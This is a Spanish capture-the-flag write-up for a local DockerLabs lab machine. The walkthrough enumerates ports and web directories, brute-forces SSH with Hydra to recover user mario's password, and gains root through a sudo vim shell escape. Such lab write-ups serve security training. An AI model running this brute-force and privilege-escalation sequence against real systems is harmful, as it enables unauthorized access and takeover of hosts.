### Reconocimiento inicial

Se realizó un escaneo de la dirección IP **172.17.0.2** utilizando **Nmap** para identificar servicios y puertos abiertos. 
##### Escaneo de Puertos abiertos: 

``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 172.18.0.2 -oN scanOpenPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 03:32 -03
Initiating ARP Ping Scan at 03:32
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 03:32, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 03:32
Scanning 172.18.0.2 [65535 ports]
Discovered open port 22/tcp on 172.18.0.2
Discovered open port 80/tcp on 172.18.0.2
Completed SYN Stealth Scan at 03:32, 0.76s elapsed (65535 total ports)
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000070s latency).
Scanned at 2025-04-20 03:32:58 -03 for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:12:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
``` 


``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ nmap -p22,80 -sCV 172.18.0.2 -oN versionPorts 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 03:43 -03
Nmap scan report for 172.18.0.2
Host is up (0.000042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds    
``` 


``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ nmap --script http-enum -p80 172.18.0.2 -oN http-enum 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 03:55 -03
Nmap scan report for 172.18.0.2
Host is up (0.000052s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```

``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ whatweb 172.18.0.2
http://172.18.0.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.18.0.2], Title[Apache2 Debian Default Page: It works]
```


``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ dirsearch -u http://172.18.0.2
```
Sin éxito


``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,py
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
``` 

/secret.php

![[Pasted image 20250420043042.png]]

No tenemos mucha información y la opción de buscar subdominos no es viable ya que estamos actuando sobre una ip, no tenemos un dominio asociado, sin embargo tenemos un posible usuario "Mario"

Prueba de fuerza bruta por SSH utilizando el usuario encontrado "Mario"

``` python 
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-20 04:45:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-20 04:45:53
``` 


``` python
┌──(kali㉿kali)-[~/DockerLabs/trustVM]
└─$ ssh mario@172.18.0.2
mario@172.18.0.2's password: 
Linux 6775dd5c01e0 6.12.20-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.20-1kali1 (2025-03-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 20 08:03:01 2025 from 172.18.0.1
mario@6775dd5c01e0:~$ whoami
mario
mario@6775dd5c01e0:~$ hostname -I 
172.18.0.2 
mario@6775dd5c01e0:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 6775dd5c01e0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 6775dd5c01e0:
    (ALL) /usr/bin/vim
mario@6775dd5c01e0:~$ ls -la
total 32
drwx------ 1 mario mario 4096 Mar 20  2024 .
drwxr-xr-x 1 root  root  4096 Mar 20  2024 ..
-rw------- 1 mario mario   39 Apr 20 08:04 .bash_history
-rw-r--r-- 1 mario mario  220 Mar 20  2024 .bash_logout
-rw-r--r-- 1 mario mario 3526 Mar 20  2024 .bashrc
-rw-r--r-- 1 mario mario  807 Mar 20  2024 .profile

mario@6775dd5c01e0:~$ sudo vim -c ':!/bin/sh'

# whoami
root
#   
``` 


https://gtfobins.github.io/gtfobins/vim/#suid

![[Pasted image 20250420051701.png]]


